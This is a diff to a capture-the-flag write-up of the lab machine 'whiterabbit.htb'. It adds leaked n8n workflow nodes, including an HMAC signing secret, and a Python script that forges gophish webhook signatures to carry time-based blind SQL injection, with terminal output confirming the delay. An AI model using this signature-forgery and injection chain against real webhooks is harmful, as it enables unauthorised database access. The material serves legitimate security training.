@@ -143,8 +143,6 @@ Vary: Accept
 X-Frame-Options: SAMEORIGIN
 ```
 
-![image](https://github.com/user-attachments/assets/62250940-c15f-47d6-aaff-7b80d68789cb)
-
 ```
 Bootstrap	5.1.3	  November 2021
 vue-i18n	9.2.2	  January 2022
@@ -177,5 +175,173 @@ Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts
 
 <img width="1920" height="653" alt="image" src="https://github.com/user-attachments/assets/a03061b4-308a-4f2e-b43e-181b9fdee320" />
 
-<img width="1910" height="836" alt="image" src="https://github.com/user-attachments/assets/4a9ab965-30c0-4f20-a80f-8d9dada15311" />
+<img width="983" height="495" alt="image" src="https://github.com/user-attachments/assets/f69b38e1-fddb-475a-86f5-422d5856cd06" />
+
+```
+Hexada@hexada ~/Downloads$ cat /etc/hosts                                                                                                                                                  
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+
+127.0.0.1       localhost
+::1             localhost
+127.0.0.1       hexada.localdomain    hexada
+192.168.0.101   cyberia
+10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb    28efa8f7df.whiterabbit.htb
+```
+
+<img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/1d5bcd3d-0eab-4b90-855f-087d9ad5b6c2" />
+
+<img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/b1523419-14ed-4224-9bb4-65c76777c5f3" />
+
+
+
+```json
+{
+        "parameters": {
+          "operation": "executeQuery",
+          "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
+          "options": {}
+        },
+        "id": "5929bf85-d38b-4fdd-ae76-f0a61e2cef55",
+        "name": "Get current phishing score",
+        "type": "n8n-nodes-base.mySql",
+        "typeVersion": 2.4,
+        "position": [
+          1380,
+          260
+        ],
+        "alwaysOutputData": true,
+        "retryOnFail": false,
+        "executeOnce": false,
+        "notesInFlow": false,
+        "credentials": {
+          "mySql": {
+            "id": "qEqs6Hx9HRmSTg5v",
+            "name": "mariadb - phishing"
+          }
+        }
+      }
+```
+
+```json
+{
+        "parameters": {
+          "action": "hmac",
+          "type": "SHA256",
+          "value": "={{ JSON.stringify($json.body) }}",
+          "dataPropertyName": "calculated_signature",
+          "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
+        },
+        "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
+        "name": "Calculate the signature",
+        "type": "n8n-nodes-base.crypto",
+        "typeVersion": 1,
+        "position": [
+          860,
+          340
+        ]
+      }
+```
+
+<img width="1280" height="520" alt="image" src="https://github.com/user-attachments/assets/cabdf99d-9ffc-4c61-842b-c95395110bd6" />
+
+```python
+import argparse
+import json
+import hmac
+import hashlib
+import requests
+
+
+class HMACExploit:
+    def __init__(self, args) -> None:
+      self.args = args
+      self.secret = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
+      self.url = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
+
+    @property
+    def SQLi(self) -> dict:
+      payload = self.args.query
+
+      return {
+          "campaign_id": 1,
+          "email": "test@\"" + payload,
+          "message": "Clicked Link",
+      }
+
+    @property
+    def body(self) -> str:
+      return json.dumps(self.SQLi, separators=(',', ':'), ensure_ascii=False)
+
+    @property
+    def signature_hex(self) -> str:
+      return hmac.new(
+          self.secret.encode('utf-8'),
+          self.body.encode('utf-8'),
+          hashlib.sha256
+      ).hexdigest()
+
+    def headers(self) -> dict:
+      return {
+          'x-gophish-signature': f'sha256={self.signature_hex}',
+          'Accept': '*/*',
+          'Accept-Encoding': 'gzip, deflate, br',
+          'Connection': 'keep-alive',
+          'Content-Type': 'application/json'
+
+          # requests сам выставит
+          # 'Content-Length': str(len(self.body_str.encode('utf-8')))
+        }
+
+    def send(self) -> requests.Response:
+        self.resp = requests.post(self.url, headers=self.headers(), data=self.body.encode('utf-8'))
+
+        return self.resp
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-q", "--query", default="", help="")
+    args = parser.parse_args()
+
+    hmac_exploit = HMACExploit(args)
+    hmac_exploit.send()
+
+    payload = (
+      f"{hmac_exploit.url}",
+      f"{hmac_exploit.headers()}",
+      f"{hmac_exploit.body}"
+    )
+
+    response = (
+      f"{hmac_exploit.resp.status_code}",
+      f"{hmac_exploit.resp.request.headers}",
+      f"{hmac_exploit.resp.request.body.decode('utf-8')}",
+      f"{hmac_exploit.resp.elapsed.total_seconds()}"
+    )
+
+    print(payload)
+    print("\n")
+    print(response)
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ python3 HMAC+SQLi.py -q "OR SLEEP(0) --"                                                                          130 ↵  
+('http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d', "{'x-gophish-signature': 'sha256=25093eeb7ed7fa1e9ec092e612de9b111c03dead069ce15362ee3e66c39df2ff', 'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Content-Type': 'application/json'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(0) -- ","message":"Clicked Link"}')
+
+
+('200', "{'User-Agent': 'python-requests/2.32.4', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'keep-alive', 'x-gophish-signature': 'sha256=25093eeb7ed7fa1e9ec092e612de9b111c03dead069ce15362ee3e66c39df2ff', 'Content-Type': 'application/json', 'Content-Length': '76'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(0) -- ","message":"Clicked Link"}', '0.402427')
+
+'0.402427'
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ python3 HMAC+SQLi.py -q "OR SLEEP(1) --"                                                                                 
+('http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d', "{'x-gophish-signature': 'sha256=08894ed36469c449f121ee736e028034ecbd499fd13d359e1da052f8a5d2d157', 'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Content-Type': 'application/json'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(1) -- ","message":"Clicked Link"}')
+
+
+('200', "{'User-Agent': 'python-requests/2.32.4', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'keep-alive', 'x-gophish-signature': 'sha256=08894ed36469c449f121ee736e028034ecbd499fd13d359e1da052f8a5d2d157', 'Content-Type': 'application/json', 'Content-Length': '76'}", '{"campaign_id":1,"email":"test@\\" OR SLEEP(1) -- ","message":"Clicked Link"}', '30.335428')
+
+'30.335428'
+```
 
